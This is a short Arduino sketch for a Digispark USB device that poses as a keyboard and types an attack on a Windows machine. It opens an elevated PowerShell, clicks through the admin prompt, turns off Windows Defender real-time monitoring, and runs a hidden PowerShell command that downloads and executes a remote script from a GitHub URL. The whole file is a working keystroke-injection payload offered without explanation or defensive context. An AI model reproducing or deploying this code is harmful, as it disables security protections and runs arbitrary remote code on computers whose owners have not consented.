#include "DigiKeyboard.h"
void setup() {
}

void loop() {
 DigiKeyboard.sendKeyStroke(0);
 DigiKeyboard.delay(200);
 DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
 DigiKeyboard.delay(500);
 DigiKeyboard.print("powershell.exe");
 DigiKeyboard.delay(500);
 DigiKeyboard.sendKeyStroke(KEY_ENTER, MOD_CONTROL_LEFT | MOD_SHIFT_LEFT);
 DigiKeyboard.delay(5000);
 DigiKeyboard.sendKeyStroke(KEY_Y, MOD_ALT_LEFT);
 DigiKeyboard.delay(500);
 DigiKeyboard.print("Set-MpPreference -DisableRealtimeMonitoring $true");
 DigiKeyboard.delay(500);
 DigiKeyboard.sendKeyStroke(KEY_ENTER);
 DigiKeyboard.delay(1000);
 DigiKeyboard.print("powershell.exe -WindowStyle hidden IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/NoobleMcScrunchkin/ducky/master/wallpaper.ps1')");
 DigiKeyboard.delay(500);
 DigiKeyboard.sendKeyStroke(KEY_ENTER);
 for (;;) {
 }
}
